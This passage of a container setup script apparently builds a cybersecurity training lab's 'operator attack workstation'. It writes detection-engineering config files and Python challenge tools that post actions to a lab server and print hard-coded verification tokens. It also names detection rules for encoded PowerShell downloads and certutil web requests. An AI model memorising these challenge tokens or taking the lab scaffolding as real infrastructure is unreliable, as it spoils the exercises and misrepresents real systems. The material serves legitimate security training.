    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-corpus" in args:
    with open("/var/log/detection/threat_hunting_corpus.json") as f:
        print(f.read())
elif "--emulate-hunt" in args or "--emulate" in args:
    payload = {
        "action": "EXECUTE_THREAT_HUNT_QUERY"
    }
    res = http_post("/api/detection-threat-hunting/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "THREAT_HUNT_HYPOTHESIS_VERIFIED":
        print("\n[+] Verification Token: THREAT_HUNT_HYPOTHESIS_VERIFIED")
elif "--tune-hypothesis" in args:
    payload = {
        "exclusion": "SCCM_Client.exe"
    }
    res = http_post("/api/detection-threat-hunting/tune-hypothesis", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_THREAT_HUNT"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "THREAT_HUNT_HYPOTHESIS_VALIDATED":
        print("\n[+] Verification Token: THREAT_HUNT_HYPOTHESIS_VALIDATED")
else:
    print("Usage: threat_hunting_tool.py [--show-corpus | --emulate-hunt | --tune-hypothesis | --challenge]")
EOF
chmod +x /home/operator/tools/threat_hunting_tool.py

# 43. Initialize Detection Room 19: CI/CD Pipelines for Detection Rules Assets
cat << 'EOF' > /var/log/detection/ci_cd_pipeline_definition.json
{
  "pipeline_name": "detection-as-code-ci-cd",
  "version_control": "GitLab CI / GitHub Actions",
  "stages": [
    "lint",
    "test",
    "security-review",
    "deploy"
  ],
  "rules_in_pipeline": [
    {
      "rule_id": "sigma-proc-01",
      "name": "PowerShell Encoded Download",
      "format": "Sigma YAML v2.0",
      "mitre_technique": "T1195.002",
      "target_backends": ["Elasticsearch", "Splunk", "Wazuh"]
    },
    {
      "rule_id": "sigma-proc-02",
      "name": "Certutil LOLBIN Web Request",
      "format": "Sigma YAML v2.0",
      "target_backends": ["Elasticsearch", "Splunk", "Wazuh"]
    }
  ],
  "status": "PIPELINE_STAGES_LOADED"
}
EOF
chmod 644 /var/log/detection/ci_cd_pipeline_definition.json

cat << 'EOF' > /home/operator/tools/pipeline_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8419
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-definition" in args:
    with open("/var/log/detection/ci_cd_pipeline_definition.json") as f:
        print(f.read())
elif "--emulate-pipeline" in args or "--emulate" in args:
    payload = {
        "action": "EXECUTE_DETECTION_PIPELINE"
    }
    res = http_post("/api/detection-pipeline/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "DETECTION_PIPELINE_VERIFIED":
        print("\n[+] Verification Token: DETECTION_PIPELINE_VERIFIED")
elif "--tune-pipeline" in args:
    payload = {
        "branch_protection": "STRICT"
    }
    res = http_post("/api/detection-pipeline/tune-pipeline", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_DETECTION_PIPELINE"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "DETECTION_PIPELINE_VALIDATED":
        print("\n[+] Verification Token: DETECTION_PIPELINE_VALIDATED")
else:
    print("Usage: pipeline_tool.py [--show-definition | --emulate-pipeline | --tune-pipeline | --challenge]")
EOF
chmod +x /home/operator/tools/pipeline_tool.py

# 44. Initialize Detection Room 20: Detection Engineering Capstone Assets
cat << 'EOF' > /var/log/detection/capstone_enterprise_pipeline.json
{
  "enterprise_grid": "VoltCorp Global SOC Infrastructure",
  "threat_scenario": "Adversary LSASS Credential Access & Multi-Stage Lateral Movement",
  "mitre_technique": "T1003.001",
  "active_layers": [
    {
      "layer": 1,
      "type": "Network Intrusion (Suricata)",
      "monitored_subnets": 12,
      "active_rules": 420
    },
    {
      "layer": 2,
      "type": "Host Behavioral (Sigma / EDR)",
      "monitored_hosts": 1250,
      "active_rules": 185
    },
    {
      "layer": 3,
      "type": "Memory & File Hunting (YARA)",
      "scanned_endpoints": 1250,
      "active_rules": 64
    },
    {
      "layer": 4,
      "type": "Correlation & Alerting (SIEM)",
      "correlation_chains": 18,
      "status": "SYNCHRONIZED"
    }
  ],
  "status": "ENTERPRISE_PIPELINE_ONLINE"
}
EOF
chmod 644 /var/log/detection/capstone_enterprise_pipeline.json

cat << 'EOF' > /home/operator/tools/capstone_pipeline_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8420
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    sess = os.getenv("SESSION_ID")
    op = os.getenv("OPERATOR_ID")
    if sess:
        headers["X-Session-ID"] = sess
    if op:
        headers["X-Operator-ID"] = op
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-pipeline" in args:
    with open("/var/log/detection/capstone_enterprise_pipeline.json") as f:
        print(f.read())
elif "--emulate-production" in args or "--emulate" in args:
    payload = {
        "action": "EVALUATE_PRODUCTION_CAPSTONE"
    }
    res = http_post("/api/detection-capstone/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CAPSTONE_PIPELINE_VERIFIED":
        print("\n[+] Verification Token: CAPSTONE_PIPELINE_VERIFIED")
elif "--tune-production" in args:
    payload = {
        "ecs_validation": "STRICT"
    }
    res = http_post("/api/detection-capstone/tune-production", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_CAPSTONE_PIPELINE"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CAPSTONE_PIPELINE_VALIDATED":
        print("\n[+] Verification Token: CAPSTONE_PIPELINE_VALIDATED")
else:
    print("Usage: capstone_pipeline_tool.py [--show-pipeline | --emulate-production | --tune-production | --challenge]")
EOF
chmod +x /home/operator/tools/capstone_pipeline_tool.py

chown -R operator:operator /home/operator /var/log/attck_evidence /var/log/recon /var/log/privesc /var/log/injection /var/log/lateral /var/log/persistence /var/log/c2 /var/log/exfil /var/log/ransomware /var/log/cloud /var/log/supply_chain /var/log/api_abuse /var/log/ad_attacks /var/log/cicd /var/log/edr_bypass /var/log/heatmap /var/log/continuous_validation /var/log/purple_capstone /var/log/detection 2>/dev/null || true

echo "=========================================================="
echo "  NO ENTRY ACADEMY // OPERATOR ATTACK WORKSTATION"
echo "  Target Host: $TARGET_HOST:$TARGET_PORT"
echo "  Available tools: nmap, curl, python3, jq, nc, ip, whoami, id, ps"
echo "=========================================================="
echo ""

if [ "$#" -eq 0 ]; then
  exec /bin/sh
else
  exec "$@"
fi
